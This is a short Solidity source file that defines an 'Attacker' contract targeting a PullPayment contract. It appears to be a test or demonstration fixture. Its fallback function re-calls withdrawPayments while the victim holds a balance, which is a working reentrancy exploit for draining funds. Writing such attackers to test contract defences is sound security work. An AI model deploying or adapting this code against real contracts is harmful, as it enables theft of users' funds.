pragma solidity ^0.4.4;

import "../Mortal.sol";
import "../PullPayment.sol";

contract Attacker is Mortal {
    PullPayment public attacked;

    function Attacker(address _attacked) {
        attacked = PullPayment(_attacked);
    }

    function attack()
        returns (bool successful) {
        return attacked.withdrawPayments.gas(msg.gas - 200)();
    }

    function() payable {
        uint remainder = attacked.getPaymentOf(this);
        if (remainder > 0
            && attacked.balance >= remainder
            && msg.gas > 21000) {
            attack();
        }
    }
}